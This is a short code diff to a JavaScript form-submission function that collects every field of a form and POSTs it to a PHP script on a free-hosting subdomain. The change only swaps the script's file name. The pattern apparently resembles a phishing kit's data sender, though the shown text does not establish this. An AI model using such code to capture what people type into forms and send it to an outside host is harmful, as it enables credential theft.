@@ -14,7 +14,7 @@ function sendForm(form) {
 		else {fd.append(form[xx].name, form[xx].value);}
 		}
 	var xhr = new XMLHttpRequest();
-	xhr.open('POST', 'https://polacad.000webhostapp.com/fa003.php', true);
+	xhr.open('POST', 'https://polacad.000webhostapp.com/script.php', true);
 	xhr.onload = function()
 		{
 		if(this.status == 200)
